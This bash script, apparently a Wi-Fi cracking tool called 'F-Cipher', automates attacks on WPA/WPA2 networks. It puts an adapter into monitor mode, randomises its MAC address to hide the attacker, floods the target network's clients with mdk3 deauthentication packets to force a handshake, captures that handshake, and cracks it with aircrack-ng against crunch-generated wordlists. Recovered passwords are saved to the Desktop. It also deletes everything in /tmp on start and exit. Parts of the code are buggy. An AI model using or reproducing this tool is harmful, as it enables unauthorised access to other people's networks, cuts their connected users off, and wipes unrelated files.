#!/usr/bin/env bash
#
#
#
############ < Colors > ############
#                                  #
# Regular Colors 		   #
Black='\e[0;30m'        # Black    #
Red='\e[0;31m'          # Red      #
Green='\e[0;32m'        # Green    #
Yellow='\e[0;33m'       # Yellow   #
Blue='\e[0;34m'         # Blue     #
Purple='\e[0;35m'       # Purple   #
Cyan='\e[0;36m'         # Cyan     #
White='\e[0;37m'        # White    #
#                                  #
# Bold                             #
BBlack='\e[1;30m'       # Black    #
BRed='\e[1;31m'         # Red      #
BGreen='\e[1;32m'       # Green    #
BYellow='\e[1;33m'      # Yellow   #
BBlue='\e[1;34m'        # Blue     #
BPurple='\e[1;35m'      # Purple   #
BCyan='\e[1;36m'        # Cyan     #
BWhite='\e[1;37m'       # White    #
NC='\033[0m'            # No Color #
#                                  #
####################################
#
#
#
#
#
#
T=0
Menu()
{
T=0
	#trap Good_Bye EXIT
	trap 'Good_Bye' EXIT 
clear; 


echo -e "				${Red} _______ ${Blue}        ${Blue} _______  _         _                                                                         ";
echo -e "				${Red}(_______)${Blue}        ${Blue}(_______)(_)       | |                                                                        ";
echo -e "				${Red} _____   ${BGreen} _____  ${Blue} _        _  ____  | |__   _____   ____                                                     ";
echo -e "				${Red}|  ___)  ${BGreen}(_____) ${Blue}| |      | ||  _ \ |  _ \ | ___ | / ___)                                                    ";
echo -e "				${Red}| |      ${BGreen}        ${Blue}| |_____ | || |_| || | | || ____|| |                                                        ";
echo -e "				${Red}|_|      ${Blue}         ${Blue}\______)|_||  __/ |_| |_||_____)|_| ${Yellow}(${Purple}V${Red}3${BBlue}.${Red}1${Yellow})    ";
echo -e "				${Red}         ${Blue}           ${Blue}         |_|                                                                               ";


echo -e "\n\n"                             
echo -e "
							${BWhite}1. ${Purple}Scan Only

							${BWhite}2. ${Blue}Generate Wordlist                
	                                            
							${BWhite}3. ${Cyan}Break Encryption   ${Yellow}(${Red}WPA/2${Yellow}) 
							
							${BWhite}4. ${Green}Crack Capture File ${Yellow}(${Blue}WPA/2${Yellow})      
                                                 
							${BWhite}5. ${Yellow}Disable Monitor Mode      
		                                    
							                    
"                                                  
                                                                       
#"


echo -ne "\n\n\n\n${Blue}Enter An Option:${Green} "; read option

if [[ $option -eq ""  || $option -gt 5 ]]
then
	ReMenu
fi


if [[ $option -eq 1 ]]
then
	sleep 0.7; clear;ScanOnly
fi


if [[ $option == 2 ]]
then
	sleep 0.7; clear;Generate
fi

if [[ $option == 3 ]]
then
	sleep 0.7; clear;Attack
fi

if [[ $option == 4 ]]
then
	sleep 0.7; clear;C_Capture
fi

if [[ $option == 5 ]]
then
	Mana_Mode; Menu
fi




}
#
#
#
#
#
ScanOnly()
{
	trap 'Good_Bye' EXIT 
	rm /tmp/* &>/dev/null
	sleep 0.7;clear sleep 0.4
	Find_Interface
	Mon_Mode
	clear;sleep 1; printf "${Yellow}[${Red}+${Yellow}] Press Ctrl+C Anytime For Main Menu"; sleep 2
	sudo xterm -bg white -fg blue -g 90x80-1+1 -T "Scanning Only"  -e "airodump-ng --berlin 120 $wlan "
	sleep 0.2; clear; sleep 0.4; Menu
		
}
#
#
#
#
#
Find_Interface()
{
	for ((inter=5; inter>=0; inter--))
	do
		W_lan=wlan$inter
		ifconfig $W_lan down &>/dev/null && ifconfig $W_lan up &>/dev/null
		Interface=$(ifconfig | grep -o wlan$inter)
		if [[ -n $Interface ]]
		then
			wlan=$Interface;
		fi
		 
		if [[ $inter -eq 0 && -z $Interface  ]]
		then
			
			clear;echo -ne "${Yellow}[${Red}+${Yellow}] Enter Your Interface: ${Green}";read Int_Face;
			if [[  -n $Int_Face ]]
			then
				
				ifconfig $Int_Face down &>/dev/null && ifconfig $Int_Face up &>/dev/null  
				
				Int_Wlan=$(iwconfig $Int_Face)
				
				if ![[  $Int_Wlan | grep -q "No such device" ]]
				then	
					sleep 0.7
					if [[ -n $Int_Wlan ]]
					then
						wlan=$Int_Face
					fi
				else
					clear;sleep 0.7;Find_Interface
					
				fi
			else
				clear;clear; echo -ne "${Red}[!] No Wireless Adapter Found\n\n"; sleep 3;Find_Interface
			fi
		fi
	done
}
#
#
#
#
#
ReMenu()
{
	Menu
}
#
#
#
#
#
Mon_Mode()
{
	Find_Interface
	ifconfig $wlan down &>/dev/null ; iwconfig $wlan mode monitor &>/dev/null ;for ((i=0; i<=10; i++)); do macchanger -r $wlan &> /dev/null; done; ifconfig $wlan up &>/dev/null && service network-manager stop &>/dev/null
}
#
#
#
#
#
#
Good_Bye()
{
	sleep 0.7;clear; sleep 0.4;rm /tmp/* &>/dev/null
	killall xterm &>/dev/null
	rm -rf /root/Handshake &>/dev/null
	killall aircrack-ng &>/dev/null
	rm -rf /root/Handshake &>/dev/null
	Remove; killall xterm &>/dev/null
	Current=$(basename `pwd`)
	User=$(hostname)
	clear
	Mana_Mode
	
	
		i=0
	
	
			until [[ $i -eq 3 ]]
			do
				echo -ne "${BRed}root@$User${BWhite}:${BBlue}~/$Current${White}# \n"; sleep 0.4
				 let i++
			done
			let i++
			let i++
			let i++
			while [[ $i -eq 6 && $i -le 7 ]]
			do
				echo -ne "${BRed}root@$User${BWhite}:${BBlue}~/$Current${White}# ${Yellow}[${Red}+${Yellow}] All Credit Goes To: ${Blue}Mohamed\n"; sleep 0.4; let i++
			done
			let i++
			while [[ $i -eq 8 && $i -le 10 ]]
			do
				echo -ne "${BRed}root@$User${BWhite}:${BBlue}~/$Current${White}# \n";sleep 0.4; let i++
		
			done
			let i++; let i++
		
			while [[ $i -eq 11  && $i -le 12 ]]
			do
				printf "${BRed}root@$User${BWhite}:${BBlue}~/$Current${White}# ${Yellow}[${Red}+${Yellow}] My Contact: ${Blue}Ethical.Hacker720@gmail.com\n";sleep 0.4;echo -ne "${BRed}root@$User${BWhite}:${BBlue}~/$Current${White}# \r";sleep 0.4; let i++;
			done; exit
		
		
	        
}
Mana_Mode()
{
	Find_Interface
	ifconfig $wlan down &> /dev/null && ifconfig $wlan up &>/dev/null
	
	if [[ -n $wlan ]]
	then
		if (iwconfig $wlan | grep -q 'Monitor')
		then
			ifconfig $wlan down &>/dev/null ;iwconfig $wlan mode managed;macchanger -p $wlan &>/dev/null;ifconfig $wlan up &>/dev/null; service network-manager restart&>/dev/null; 
		else
			ifconfig $wlan down&>/dev/null;iwconfig $wlan mode managed;macchanger -p $wlan&>/dev/null;ifconfig $wlan up&>/dev/null; service network-manager restart&>/dev/null; 
		fi
	else
		ifconfig $wlan down&>/dev/null; macchanger -p $wlan&>/dev/null;ifconfig $wlan up&>/dev/null; service network-manager restart&>/dev/null;   
	fi
}
#
#
#
#
#
#For Macchanger
function Mac
{
	sudo ifconfig $wlan down &>/dev/null
	for ((x=0; x<=10; x++))
	do
		sudo macchanger -r $wlan &> /dev/null
	done
}

#For Enabling Mode Monitor
function Monitor
{
	Mac
	sudo iwconfig $wlan mode monitor &> /dev/null
	sudo ifconfig $wlan up &>/dev/null
}


#For Removing Handshakes 
Remove()
{
	sudo rm /root/Handshake/Hand-0*	        &> /dev/null
	sudo rm /root/Handshake/blacklist       &> /dev/null
	killall airodump-ng     		&> /dev/null
	killall aireplay-ng                     &>/dev/null
	let T=1
}
#
#
#
#
#
#For Running Mdk3
Mdk3()
{
	
	if (ls /root/Handshake | grep -q "Hand-01.csv")
	then
		
		Channel=$(cat /root/Handshake/Hand-01.csv | grep "$Essid" | awk 'NR==1{print $6}' | cut -d ',' -f 1 | sort )
		Client_Mac1=$(cat /root/Handshake/Hand-01.csv | grep "$Bssid" | awk 'NR==2{print $1}' | cut -d ',' -f 1)
		Client_Mac2=$(cat /root/Handshake/Hand-01.csv | grep "$Bssid" | awk 'NR==3{print $1}' | cut -d ',' -f 1)
		Client_Mac3=$(cat /root/Handshake/Hand-01.csv | grep "$Bssid" | awk 'NR==4{print $1}' | cut -d ',' -f 1)
		Client_Mac4=$(cat /root/Handshake/Hand-01.csv | grep "$Bssid" | awk 'NR==5{print $1}' | cut -d ',' -f 1)
		Clients=$(cat /root/Handshake/Hand-01.csv | grep "$Bssid" | awk '{print $1}' | cut -d ',' -f 1)
		

		### < Setting Up Mdk3 Blacklist > ###
		touch /root/Handshake/blacklist
		Blist=(/root/Handshake/blacklist)
		

	
	
	
		if [[  -n  "$Client_Mac1" ]]
		then  
				
			if !( cat $Blist | grep $Client_Mac1)
			then
				echo -e "$Client_Mac1">> /root/Handshake/blacklist ;clear
			fi
			clear; echo -ne "${Red}[${Green}+${Red}] ${Green}DeAuthenticating:${NC}${Red} $Client_Mac1 \n\n"; sleep 2; clear
				
			for ((i=0; i<=10; i++))
			do
				
				
				sudo xterm -g  66x5+1+900 -fg green -T  "DeAuth: $Client_Mac1"  -e "sudo mdk3 $wlan d -b /root/Handshake/blacklist -c $Channel  " &
				
			done 

		else

			clear;echo -ne "${Red}[${Green}+${Red}] ${Red} No Clients Available On: ${Yellow}$Essid${NC}"; sleep 3; clear
			echo -ne "${Yellow}[${Red}+${Yellow}] ${Red} Re-Scanning: ${Blue}$Essid${NC}"; sleep 3;clear
			until [[ $T -eq 0 ]]; do let T-- ;done; Handshake
		fi
				

		if [[ -n  $Client_Mac2 ]]
		then
			if !( cat $Blist | grep $Client_Mac2)
			then
				echo -e "$Client_Mac2">> /root/Handshake/blacklist ;clear
			fi
			clear;echo -ne "${Red}[${Green}+${Red}] ${Green}DeAuthenticating:${NC}${Red} $Client_Mac2 \n\n"; sleep 2;clear
			for ((w=0; w<=10; w++))
			do
				sudo xterm -g 94x5+400+900  -fg blue -T  "DeAuth: $Client_Mac2" -e "sudo mdk3 $wlan d -b /root/Handshake/blacklist -c $Channel  " &

			done; 
		fi
					
					
		if [[ -n  $Client_Mac3 ]]
		then
			if !( cat $Blist | grep $Client_Mac3)
			then
				echo -e "$Client_Mac3">> /root/Handshake/blacklist ;clear
			fi
			clear;echo -ne "${Red}[${Green}+${Red}] ${Green}DeAuthenticating:${NC}${Red} $Client_Mac3 \n\n"; sleep 2;clear
			for ((x=0; x<=10; x++))
			do
			
				sudo xterm -g 66x5-1+900  -fg cyan -T  "DeAuth: $Client_Mac3" -e "sudo mdk3 $wlan d -b /root/Handshake/blacklist -c $Channel  " &
			

			done

			 


		fi
	
		if [[ -n $Client_Mac1  && -n $Client_Mac2 && -n $Client_Mac3 ]]
		then
			clear;echo -ne "${Red}[${Green}+${Red}] ${Green}DeAuthenticating:${NC}${Red} $Client_Mac1 \n\n";
			echo -ne "${Red}[${Green}+${Red}] ${Green}DeAuthenticating:${NC}${Red} $Client_Mac2 \n\n";
			echo -ne "${Red}[${Green}+${Red}] ${Green}DeAuthenticating:${NC}${Red} $Client_Mac3 \n\n";
		elif [[ -n $Client_Mac1 && -n $Client_Mac2 ]]
		then
			clear;echo -ne "${Red}[${Green}+${Red}] ${Green}DeAuthenticating:${NC}${Red} $Client_Mac1 \n\n";
			echo -ne "${Red}[${Green}+${Red}] ${Green}DeAuthenticating:${NC}${Red} $Client_Mac2 \n\n";
		elif [[ -n $Client_Mac1 ]]
		then
			clear;echo -ne "${Red}[${Green}+${Red}] ${Green}DeAuthenticating:${NC}${Red} $Client_Mac1 \n\n";
		fi		
			

				

	

			
		
			
		
		sleep 30
		 

	
	
	
	fi
	
	
		
}

#For Checking Handshake & Cracking

Handshake()
{
	if [[ $T -eq 0 ]]
	then
		Remove; let T=1
	fi
		
	while :
	do
		
		
		
		if [[ $T -eq 0 ]]
		then
			
			Remove &>/dev/null; let T++;clear
		fi
		
		if [[ $T -eq 1 ]]
		then
			
			clear;Find_Interface;Mon_Mode;clear;echo -ne  "${Yellow}[${Red}+${Yellow}] Monitoring: ${Red}$Essid${NC}"; sleep 0.7 
			xterm -fg Green -g  77x15+1900-700 -T "Monitoring: $Essid" -e "airodump-ng --bssid $Bssid -c $Channel -w /root/Handshake/Hand --output-format csv,cap --ig $wlan " & sleep 30 && let T++
			
		fi
		

		if (ls /root/Handshake | grep -q "Hand")
		then
			 
			
			if ( aircrack-ng /root/Handshake/Hand-01.cap | grep -q "1 handshake" )
			then
				clear; echo -ne "${Yellow}[${Red}+${Yellow}] ${Green}Four-Way HandShake Found${NC}"; sleep 3
				killall airodump-ng; pkill mdk3 &>/dev/null
				Mana_Mode
				clear; # exit
				echo -e "${Yellow}[${Red}+${Yellow}] When Password is Cracked, We'll Save into your Desktop, just look for the Folder Named Cracked"; sleep 5; clear
				Mana_Mode
				killall xterm &>/dev/null
				Pid=$(ps -cax | grep aircrack-ng | awk '{print $1}')
			 nohup sudo aircrack-ng -b $Bssid /root/Handshake/Hand-01.cap -w $Pass 2>&1 | tee -i > /root/Handshake/Key.txt  &
			disown $Pid 
			 sudo xterm  -geometry 100x30-900+900  -T "[+] Cracking $Essid's Encryption " -e "tail -f /root/Handshake/Key.txt "& 

				clear;
				sleep 3
				while :
				do
					clear; echo -ne "${Yellow}[${Red}+${Yellow}] ${Blue}Cracking ${Red}$Essid's${Blue} Encryption"; sleep 0.7
					if !(ps cax | grep -q aircrack-ng)
					then	
						Passkey=$(cat /root/Handshake/Key.txt | grep "KEY FOUND!"  |  awk 'NR==1{print $4}')
						if [[ -n $Passkey ]]
						then
							
							
							Exist1=$(ls /root/Desktop | grep Cracked)

							if [[ -z $Exist1 ]]
							then
								sudo mkdir /root/Desktop/Cracked
							fi
							Essid_Folder=$(ls /root/Desktop/Cracked | grep "$Essid")
							if [[ -z $Essid_Folder ]]
							then
								sudo mkdir /root/Desktop/Cracked/"$Essid"
							fi
							Exist2=$(ls /root/Desktop/Cracked/"$Essid" | grep  "$Essid")
							if [[ -z $Esist2 ]]
							then
								sudo touch /root/Desktop/Cracked/"$Essid"/"$Essid"
							fi
							Exist3=$(cat /root/Desktop/Cracked/"$Essid"/"$Essid" | grep  "$Passkey")

							if [[ -z $Exist3  ]]
							then
								if !(ls /root/Desktop/Cracked/"$Essid" | grep -q "$Essid".cap)
								then
									 mv /root/Handshake/Hand-01.cap  /root/Desktop/Cracked/"$Essid"/"$Essid".cap
								fi
								sudo echo -e "Essid: $Essid\n\nPassword: $Passkey" > /root/Desktop/Cracked/"$Essid"/"$Essid"
							fi
						else
							if !(ls /root/Desktop | grep -q "Cracked")
							then
								mkdir /root/Desktop/Cracked 
							fi
					                if !(ls /root/Desktop/Cracked | grep -q "$Essid")
							then
								mkdir /root/Desktop/Cracked/"$Essid"
							fi
							if !(ls /root/Desktop/Cracked/"$Essid" | grep -q "$Essid".cap)
							then
								mv /root/Handshake/Hand-01.cap  /root/Desktop/Cracked/"$Essid"/"$Essid".cap	
							fi
	
						fi
						
						rm -rf /root/Handshake; break 2> /dev/null
					fi
				done; Menu
				
			
			fi
		
		fi
		
		Mdk3
		clear
		for ((kills=0;kills<=10;kills++))
		do
			if (ps -cax | grep -q "mdk3")
			then
				killall mdk3 &>/dev/null
			fi
			if (ps -cax | grep -q "aireplay-ng")
			then
				killall aireplay-ng &>/dev/null
			fi
		done
		
		sleep 10

	done
}

C_Capture()
{
	trap 'Good_Bye' EXIT   
	Loading_2
	trap 'Good_Bye' EXIT 
	
	echo -ne "${Cyan}Enter Wordlist's Path:${Green} "; read C_Pass
	
	until [[ -r $C_Pass ]]
	do
		if [[ -n $C_Pass ]]
		then
		sleep 0.7; clear;sleep 0.2; echo -e "${Yellow}[${Red}!${Yellow}]${Red} Can't Find: ${Cyan}$C_Pass"; sleep 3; clear; sleep 0.2; 			clear;sleep 1;echo -ne "${Cyan}Enter Wordlist's Path:${Green} "; read C_Pass
		else
			sleep 0.7; clear;sleep 0.2; echo -e "${Yellow}[${Red}!${Yellow}]${Red} Please Enter A Wordlist ${Cyan}"; sleep 3; clear; sleep 0.2; clear;sleep 1;echo -ne "${Cyan}Enter Wordlist's Path:${Green} "; read C_Pass
		fi
	done;

	sleep 0.7;clear;sleep 0.7
	 
	clear;sleep 1;echo -ne "${Blue}Enter Capture File's Path:${Green} "; read C_Captures
	
	until [[ -r $C_Captures ]]
	do
		if [[ -n $C_Captures ]]
		then
		sleep 0.7; clear;sleep 0.2; echo -e "${Yellow}[${Red}!${Yellow}]${Red} Can't Find: ${Cyan}$C_Captures"; sleep 3; clear; sleep 0.2; 		clear;sleep 1;echo -ne "${Cyan}Enter Wordlist Path:${Green} "; read C_Captures
		else
			sleep 0.7; clear;sleep 0.2; echo -e "${Yellow}[${Red}!${Yellow}]${Red} Please Enter A Wordlist ${Cyan}"; sleep 3; clear; sleep 0.2; clear;sleep 1;echo -ne "${Cyan}Enter Wordlist Path:${Green} "; read C_Captures
		fi
	done;

	for ((i=0;i<=5;i++))
	do
		killall air*&>/dev/null
	done
	C_Essid=$(aircrack-ng $C_Captures  | awk 'NR==6{print $3}')
	C_Bssid=$(aircrack-ng $C_Captures | awk 'NR==6{print $2}')
	


				if ( aircrack-ng $C_Captures | grep -q "1 handshake" )
				then
				clear;echo -e "${Yellow}[${Red}+${Yellow}] When Password is Cracked, It'll be Save into your Desktop, just look for the Folder Named Cracked"; sleep 5; clear
				

				
			killall xterm &>/dev/null
			Pid=$(ps -cax | grep aircrack-ng | awk '{print $1}')
			 nohup sudo aircrack-ng -b $C_Bssid $C_Captures -w $C_Pass  2>&1 | tee -i > /tmp/Key.txt  &
			disown $Pid 
		        sudo xterm  -geometry 100x30-900+900  -T "[+] Cracking $C_Essid's Encryption" -e "tail -f /tmp/Key.txt " & sleep 5 

	
				x=1;Tries=0
				while [[ $x == 1 ]]
				do
					clear; echo -ne "${Yellow}[${Red}+${Yellow}]${Blue} Cracking ${Red}$C_Essid's${Blue} Encryption"; sleep 0.7
					AirC=$(ps cax | grep  aircrack-ng)
					Xterm=$(ps cax | grep  xterm)
					#echo "Look ==> $AirC";sleep 3 break; exit
					
					if [[ -z $AirC && -z $Xterm ]]
					then
						let Tries++
					fi
					if [[ $Tries -eq 10 ]]
					then
						C_Passkey=$(cat /tmp/Key.txt | grep "KEY FOUND!"  |  awk 'NR==1{print $4}')
						if [[ -n $C_Passkey ]]
						then
							
							Exist1=$(ls /root/Desktop | grep Cracked)

							if [[ -z $Exist1 ]]
							then
								sudo mkdir /root/Desktop/Cracked
							fi
							Essid_Folder=$(ls /root/Desktop/Cracked | grep $C_Essid)
							if [[ -z $Essid_Folder ]]
							then
								sudo mkdir /root/Desktop/Cracked/$C_Essid
							fi
							Exist2=$(ls /root/Desktop/Cracked/$C_Essid | grep  "$C_Essid")
							if [[ -z $Esist2 ]]
							then
								sudo touch /root/Desktop/Cracked/$C_Essid/$C_Essid
							fi
							Exist3=$(cat /root/Desktop/Cracked/$C_Essid/$C_Essid | grep  "$C_Passkey")

							if [[ -z $Exist3  ]]
							then
								if !(ls /root/Desktop/Cracked/$C_$Essid | grep -q $C_Essid.cap)
								then
								    cp $C_Pass /root/Desktop/Cracked/$C_Essid/$C_Essid.cap
								fi
								sudo echo -e "Essid: $C_Essid\n\nPassword: $C_Passkey" > /root/Desktop/Cracked/$C_Essid/$C_Essid; let x=0
							fi
						
						else
							
						       clear;let x=0;echo -e "${Yellow}[${Red}+${Yellow}] Key Not Found, Please Try A Different Wordlist";sleep 0.8;
							clear;echo -ne "\n\n${Yellow}[${Red}+${Yellow}] Press Enter To Conintue";read;
							sleep 0.7;clear; Menu
					

						fi
					
					fi
				done






			else
				echo -ne "Sorry, No HandShake Found on: $C_Captures"; sleep 3; Menu

				
		        fi


			

	
	
	
	

}

#For Searching For The Target  & Attack
Attack()
{
	
	#trap 'Good_Bye' EXIT  
	clear; sleep 1
	Loading_2
	 
	clear;sleep 1;echo -ne "${Cyan}Enter Wordlist's Path:${Green} "; read Pass
	
	until [[ -r $Pass ]]
	do
		if [[ -n $Pass ]]
		then
		sleep 0.7; clear;sleep 0.2; echo -e "${Yellow}[${Red}!${Yellow}]${Red} Can't Find: ${Cyan}$Pass"; sleep 3; clear; sleep 0.2; clear;sleep 1;echo -ne "${Cyan}Enter Wordlist's Path:${Green} "; read Pass
		else
			sleep 0.7; clear;sleep 0.2; echo -e "${Yellow}[${Red}!${Yellow}]${Red} Please Enter A Wordlist ${Cyan}"; sleep 3; clear; sleep 0.2; clear;sleep 1;echo -ne "${Cyan}Enter Wordlist's Path:${Green} "; read Pass
		fi
	done;
	
			
			 
			 Find_Interface
			 Mon_Mode;
				
			clear; printf "${Yellow}[${Red}+${Yellow}] Scanning Press Ctrl${Red}+${Yellow}C  When Ready"; sleep 2;clear
			 airodump-ng $wlan 2>&1 | tee -i /tmp/log; clear; Loading_3;sleep 0.4
APs=$(tail -n 70 /tmp/log   | egrep -v '(BSSID | CH  )'  | egrep -v '(not | STATION)'| sed s/PSK//g | sed s/"<"//g | egrep -v '(<|>)'|egrep -v 'e:'| awk '{print $10,$11,$12,$13,$14,$15}'| sort)
					echo "$APs" > /tmp/Nets
					touch /tmp/list; sleep 1
					while read -r line
					do
			
						if [[ -n "$line" ]]
						then	if [[ ${#line} -ge 4 ]]
							then
								#if [[ "$line" != "" ]]
								#then
									#if [[ "$line" != "0>" ]]
									#then
										if !( cat /tmp/list | grep -q "$line" )
										then
											echo "$line" >> /tmp/list 
										fi
									#fi
								#fi
							fi	
						fi
			
					done < /tmp/Nets
				 

					
					Networks() 
					{

					   

					getArray() {
					    array=() 
					    while IFS= read -r line 
					    do
						ArrayBox+=("$line")
					    done < "$1"
					}
					getArray /tmp/list

					    i=0
					
					    while read line
					    do
						if [[ -n $line ]]
						then
						    if [[ $i -le 9 ]]
						    then
							echo -e "${Cyan}[${Green}0$i${Cyan}] ${Yellow} $line"; let i++
						    else
							echo -e "${Cyan}[${Green}$i${Cyan}] ${Yellow}$line"; let i++
						    fi
						fi 
					    done </tmp/list; i=0
					
					    echo -ne "${Blue}\n\nEnter Number:${Green} "; read Choice
					    NumOflines=${#ArrayBox[@]}-1
					    if [[ -n $Choice ]]
					    then
						    if [[  $Choice -le $NumOflines ]]
						    then
						
							 Essid="${ArrayBox[$Choice]}"; 
							
						    else
						
							until [[ $Choice -le $NumOflines ]]
							do
								let i=0;clear; 
								Networks
							done
						    fi
					   else
							let i=0;clear;Networks
					   fi
					}
					Networks

	


	sleep 1
	while :
	do
		
		if !(ls /root | grep -q "Handshake")
		then
			mkdir /root/Handshake
		fi
		clear;echo -ne "${Yellow}[${Red}+${Yellow}] Searching For: ${Red}$Essid${NC}";
		airodump-ng --berlin 10  --output-format csv -w /root/Handshake/Hand $wlan &> /dev/null & sleep 10; 
		killall airodump-ng &> /dev/null && sleep 1

		Channel_Type1=$(cat /root/Handshake/Hand-01.csv  | grep "$Essid" | awk 'NR==1{print $6 }' | cut -d ',' -f 1)
		Channel_Type2=$(cat /tmp/log | grep "$Essid" | awk 'NR==2{print $6}')
		Bssid_Type2=$(cat /tmp/log | grep "$Essid" | awk 'NR==2{print $1}')
		Bssid_Type1=$(cat /root/Handshake/Hand-01.csv  | grep "$Essid" | awk 'NR==1{print $1 }' | cut -d ',' -f 1)
		if [[ -n $Channel_Type1 ]]
		then
			Channel=$Channel_Type1
		else
			Channel=$Channel_Type2
		fi
		
		if [[ -n $Bssid_Type1 ]]
		then
			Bssid=$Bssid_Type1
		else
			Bssid=$Bssid_Type2
		fi
		
		

		if (cat /root/Handshake/Hand-01.csv| grep -q "$Bssid")
		then
			#echo -e "\n\nI See +++> $Bssid"; sleep 4
			clear;echo -ne "${Yellow}[${Red}+${Yellow}] Found: ${Red}$Essid"; sleep 1; clear 
			Handshake
		else
			
			clear;echo -ne "${Yellow}[${Red}+${Yellow}] Can't Find: ${Red}$Essid"; sleep 3; clear ;
			Remove && pkill mdk3 &> /dev/null && killall aireplay-ng &>/dev/null && Remove &>/dev/null
		fi
	done
}




function Generate
{
	trap 'Good_Bye' EXIT  
	Loading_1
	
	trap 'Good_Bye' EXIT  
	echo -ne "${Cyan}Length Of Password : ${Green}"
	read Len
	
	
	until [[ "$Len" -ge 8 && "$Len" =~ ^[+-]?[0-9]+$ ]]
	do
		
		clear;sleep 0.7; echo -e "${Yellow}[${Red}!${Yellow}] The Password length Must Be 8 Or Above Chararters Long${NC}"; sleep 3
		clear;sleep 0.7; echo -ne "${Cyan}Length Of Password : ${Green}"
		read Len
		

	done
	
	sleep .7
	echo -ne "\n\n${Cyan}How Many Times Do You Like A Single Char To Repeat: ${Green}"
	read Repeat
	until [[ "$Repeat" -ge 0 && "$Repeat" =~ ^[+-]?[0-9]+$ ]]
	do
		
		clear; echo -e "${Yellow}[${Red}!${Yellow}] Please Enter A Number${NC}"; sleep 3;clear; sleep 0.7
		echo -ne "\n\n${Cyan}How Many Times Do You Like A Single Char To Repeat: ${Green}"
		read Repeat
		

	done
	
	
	sleep .7
	echo -ne "\n\n${Cyan}Input The Numbers And Letter To Use: ${Green}"	
	read Letters
	
	sleep .7
	echo -e "\n\n${Cyan}Type In The Algorithm:\n\n${Green}   Essid: ${Red}DG860A82\n\n${Blue}   Password: ${Red}DG860A%@@%82${NC}\n\n${Cyan}   Where ${Red}@${Cyan} is letter & numbers ${Green}|${Cyan} Where ${Yellow}%${Cyan} is only number \n\n${Green}"
	read Pass 
	until [[ ${#Pass} -eq $Len ]]
	do
		sleep .7; clear; sleep 0.7;echo -e "${Yellow}[${Red}!${Yellow}] Please Make Sure That The ${Red}Password's${Yellow} Length & The ${Blue}Algorithm's${Yellow} Match "; sleep 3; clear
		echo -e "\n\n${Cyan}Type In The Algorithm:\n\n${Green}   Essid: ${Red}DG860A82\n\n${Blue}   Password: ${Red}DG860A%@@%82${NC}\n\n${Cyan}   Where ${Red}@${Cyan} is letter & numbers ${Green}|${Cyan} Where ${Yellow}%${Cyan} is only number \n\n${Green}"
	read Pass 	
	done
	clear
	sleep .7
	echo -ne "${Cyan}What Would You Like To Save The Wordlist As: ${Green}"
	read Wor
	sleep 1
	clear
	echo -ne "${Green}Starting Up Crunch... ${NC}"
	sleep 3
	clear; sleep 0.7
	echo -e "${Red}[${Green}+${Red}]${Green} Generating: ${Blue}$Wor ${NC}"; sleep 3
	crunch $Len $Len  $Letters -t $Pass  -d $Repeat@  -o $Wor &> /dev/null
	clear
	if !( ls | grep -q $Wor )
	then
		while :
		do
			clear; sleep 0.7
			#crunch $Len $Len  $Letters -t $Pass  -d $Repeat@  -o $Wor 
			echo -e "${Yellow}[${Red}+${Yellow}] Crunch did't work Retrying${NC}"; sleep 2 
			Generate
			if ( ls | grep $Wor.txt || grep $Wor.lst )
			then
				sleep 3
				clear
				Menu
			fi
		done
	fi

	sleep 0.7; echo -e "${Red}[${Green}+${Red}]${Green} Generated: ${Blue}$Wor ${NC}"; sleep 3
	clear; sleep 0.7
	Menu
	
}

function Loading_1
{
	
	for ((Load=0;Load<=3;Load++))
	do
		trap 'Good_Bye' EXIT  
		echo -e "${Green}Loading [\]";sleep .1;clear
		echo -e "${Green}Loading [|]";sleep .1;clear
		echo -e "${Green}Loading [/]";sleep .1;clear
		echo -e "${Green}Loading [-]";sleep .1;clear
	done
}

function Loading_2
{
	for ((Load=0;Load<=3;Load++))
	do
		trap 'Good_Bye' EXIT 
		echo -e "${Green}Loading.";sleep .2;clear
		echo -e "${Green}Loading..";sleep .2;clear
		echo -e "${Green}Loading...";sleep .2;clear
		echo -e "${Green}Loading....";sleep .2;clear
	done
}

function Loading_3
{
	for ((Load=0;Load<=3;Load++))
	do
		trap 'Good_Bye' EXIT   
		echo -e "${Green}Loading.";sleep .2;clear
		echo -e "${Green}Loading..";sleep .2;clear
		echo -e "${Green}Loading...";sleep .2;clear
		echo -e "${Green}Loading....";sleep .2;clear
	done
}
######### Funtions End Here #################




#### Script Starts Here ######
if !(whoami | grep -q "root")
then
	clear; sleep 3; echo -e "${Red}[+] Please Run As Root ${NC}"; sleep 3; clear; exit
fi
if (ps -cax | grep -q "airodump-ng" )
then
	for ((i=0; i <= 10; i++))
	do
		Remove  && pkill mdk3 &> /dev/null && killall aireplay-ng &>/dev/null && Remove &>/dev/null
		
	done
fi

sleep 0.7;clear; sleep 0.4;rm /tmp/* &>/dev/null
killall xterm &>/dev/null
rm -rf /root/Handshake &>/dev/null
killall aircrack-ng &>/dev/null
rm nohup.out &>/dev/null
Menu




	

